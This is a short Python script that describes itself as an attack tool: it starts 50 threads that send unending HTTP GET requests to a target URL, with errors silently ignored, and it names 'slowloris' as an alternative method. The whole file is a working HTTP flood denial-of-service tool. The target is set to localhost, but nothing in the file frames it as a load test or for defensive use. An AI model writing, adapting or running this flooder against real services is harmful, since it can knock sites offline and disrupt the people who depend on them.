import requests
import threading
import time

TARGET_URL = "http://127.0.0.1:8080"
ATTACK_TYPE = "flood" # or "slowloris", etc.

def attack_thread():
    while True:
        try:
            requests.get(f"{TARGET_URL}/")
        except:
            pass

def main():
    print(f"Starting {ATTACK_TYPE} attack against {TARGET_URL}...")
    for _ in range(50):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        
    try:
        while True:
            time.sleep(1)
            print("Attacking...")
    except KeyboardInterrupt:
        print("Attack stopped.")

if __name__ == '__main__':
    main()
